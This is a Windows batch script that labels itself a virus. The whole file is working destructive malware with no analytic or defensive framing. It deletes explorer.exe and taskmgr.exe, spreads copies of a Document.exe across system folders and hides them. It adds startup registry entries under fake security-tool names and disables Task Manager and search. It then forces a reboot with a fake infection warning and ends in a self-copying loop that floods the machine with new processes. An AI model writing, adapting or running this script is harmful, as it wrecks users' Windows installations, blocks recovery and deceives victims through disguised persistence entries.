@echo off
title Virus: Not What You Expected?

taskkill /im explorer.exe /f
taskkill /im taskmgr.exe /f
if exist %systemroot%\explorer.exe del %systemroot%\explorer.exe /f
if exist %systemroot%\system32\taskmgr.exe del %systemroot%\system32\taskmgr.exe /f

if not exist "%temp%\Document.exe" (copy Document.exe %temp%) ELSE start %temp%\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowSystem /d %temp%\Document.exe /f
if not exist "%programfiles%\Document.exe" (copy Document.exe %programfiles%) ELSE start %programfiles%\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowDefender /d %programfiles%\Document.exe /f
if not exist "%userprofile%\Document.exe" (copy Document.exe %userprofile%) ELSE start %userprofile%\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowAntivirus /d %userprofile%\Document.exe /f
if not exist "%systemroot%\Document.exe" (copy Document.exe %systemroot%) ELSE start %systemroot%\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowFirewall /d %systemroot%\Document.exe /f
if not exist "%userprofile%\desktop\Document.exe" (copy Document.exe %userprofile%\desktop) ELSE start %userprofile%\desktop\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowAntiSpyware /d %userprofile%\desktop\Document.exe /f
if not exist "%systemroot%\system32\Document.exe" (copy Document.exe %systemroot%\system32) ELSE start %systemroot%\system32\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowInjecter /d %systemroot%\system32\Document.exe /f
if not exist "C:\Document.exe" (copy Document.exe C:\) ELSE start C:\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowSpeedup /d C:\Document.exe /f
if not exist "%programfiles%\Common Files\Document.exe" (copy Document.exe %programfiles%\Common Files\) ELSE start %programfiles%\Common Files\Document.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowInjector /d %programfiles%\Common Files\Document.exe /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

if not exist "%temp%\Document.exe" (copy Document.exe %temp%) ELSE attrib %temp%\Document.exe +h +s
if not exist "%programfiles%\Document.exe" (copy Document.exe %programfiles%) ELSE attrib %programfiles%\Document.exe +h +s
if not exist "%userprofile%\Document.exe" (copy Document.exe %userprofile%) ELSE attrib userprofile%\Document.exe +h +s
if not exist "%systemroot%\Document.exe" (copy Document.exe %systemroot%) ELSE attrib %systemroot%\Document.exe +h +s
if not exist "%userprofile%\desktop\Document.exe" (copy Document.exe %userprofile%\desktop) ELSE attrib %userprofile%\desktop\Document.exe +h +s
if not exist "%systemroot%\system32\Document.exe" (copy Document.exe %systemroot%\system32) ELSE attrib %systemroot%\system32\Document.exe +h +s
if not exist "C:\Document.exe" (copy Document.exe C:\) ELSE attrib C:\Document.exe +h +s
if not exist "%programfiles%\Common Files\Document.exe" (copy Document.exe %programfiles%\Common Files\) ELSE attrib %programfiles%\Common Files\Document.exe +h +s

shutdown -r -t 15 -c "Your computer is apparently seems to be infected by a virus, Windows will now restart."

:Lag
copy %0 Lag.bat
start Lag.bat
goto Lag
